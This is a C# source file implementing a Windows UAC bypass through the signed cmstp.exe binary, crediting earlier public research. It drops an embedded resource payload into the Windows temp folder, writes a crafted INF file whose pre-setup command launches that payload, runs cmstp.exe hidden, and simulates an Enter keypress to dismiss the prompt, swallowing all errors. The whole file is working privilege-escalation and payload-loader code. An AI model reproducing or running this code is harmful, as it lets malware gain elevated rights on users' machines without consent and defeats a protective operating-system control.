/*
UAC Bypass using CMSTP.exe microsoft binary

Based on previous work from Oddvar Moe
https://oddvar.moe/2017/08/15/research-on-cmstp-exe/

And this PowerShell script of Tyler Applebaum
https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1

Code author: Andre Marques (@_zc00l)
*/
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;
using System.Resources;
using System.Reflection;

public class CMSTPBypass
{
    // Our .INF file data!
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""NyanCat""
ShortSvcName=""NyanCat""

";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static void Main( )
    {
        try
        {
            string tempFile = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp\\" + Path.GetRandomFileName().Split(Convert.ToChar("."))[0] + "#exe";
            File.WriteAllBytes(tempFile, GetResource("#payload"));
            StringBuilder InfFile = new StringBuilder();
            InfFile.Append(SetInfFile("cmd /c start \"" + tempFile + "\""));
            ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
            startInfo.Arguments = "/au " + InfFile.ToString();
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(startInfo);
            IntPtr windowHandle = new IntPtr();
            windowHandle = IntPtr.Zero;
            do
            {
                windowHandle = SetWindowActive("cmstp");
            } while (windowHandle == IntPtr.Zero);

            System.Windows.Forms.SendKeys.SendWait("{ENTER}");
        }
        catch { }
        Environment.Exit(0);
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if (target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }

    private static byte[] GetResource(string file)
    {
        ResourceManager ResManager = new ResourceManager("#resource", Assembly.GetExecutingAssembly());
        return (byte[])ResManager.GetObject(file);
    }
}